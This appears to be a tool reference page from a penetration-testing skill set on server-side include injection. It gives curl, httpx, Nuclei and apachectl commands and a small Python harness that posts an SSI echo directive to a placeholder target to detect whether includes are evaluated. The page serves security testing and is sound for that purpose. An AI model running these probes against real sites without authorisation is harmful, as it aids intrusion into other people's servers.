# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`server-side-includes-injection`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/profile.shtml' --data-urlencode 'bio=<echo directive>'` | Submit the directive and read whether the server variable resolves in the returned page | Cross-platform |
| `httpx` | `httpx -u https://target.example/profile.shtml -mr GMT` | Match a rendered GMT timestamp, and repeat with UTC, that appears only when the echo directive evaluated | Cross-platform |
| `Nuclei` | `nuclei -u https://target.example -tags ssi` | Run community server-side-include templates that send an echo differential and flag evaluation | Cross-platform |
| `apachectl` | `apachectl -S; grep -R 'Options .*Includes' /etc/apache2` | Confirm from server configuration whether Includes and exec are enabled on the path under test | Linux |

## Minimal Script Shape

A literal-versus-directive harness: it posts an encoded echo and a raw echo to the same field and reports whether the raw directive was consumed by the parser, which indicates server-side include evaluation.

```python
import urllib.parse
import urllib.request

URL = "https://target.example/profile.shtml"
FIELD = "bio"


def submit(value):
    data = urllib.parse.urlencode({FIELD: value}).encode()
    req = urllib.request.Request(URL, data=data)
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")


literal = submit('&lt;!--#echo var="DATE_LOCAL"--&gt;')
directive = submit('<!--#echo var="DATE_LOCAL"-->')
evaluated = "#echo var" not in directive and "#echo var" in literal
print({"directive_evaluated": evaluated})
```
